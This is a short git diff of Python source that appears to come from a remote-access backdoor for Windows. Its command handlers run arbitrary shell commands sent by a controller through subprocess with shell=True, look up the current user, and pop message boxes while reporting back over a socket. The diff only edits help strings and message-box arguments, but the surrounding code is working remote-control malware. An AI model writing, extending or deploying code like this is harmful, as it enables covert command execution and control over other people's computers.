@@ -2,7 +2,7 @@ import subprocess,win32api,ctypes,getpass,sock
 class cmd:
     def __init__(self):
         self.command = 'cmd'
-        self.description = 'shell command execution\n'
+        self.description = 'shell command execution with cmd <command>\n'
         self.args = True
     def main(self,data):
         proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
@@ -25,10 +25,10 @@ class getuser:
 class messagebox:
     def __init__(self):
         self.command = 'messagebox'
-        self.description = 'generating a custom messagebox with: messagebox <message> <window title>\n'
+        self.description = 'generating a custom messagebox with: messagebox <message>\n'
         self.args = True
     def main(self,args):
         Box = ctypes.windll.user32.MessageBoxA
         sock.sock.s.send("Box was opened\n")
-        Box(None,args.split(" ")[0],args.split(" ")[1], 0)
+        Box(None,"Message",args, 0)
         return "Message box was closed\n"
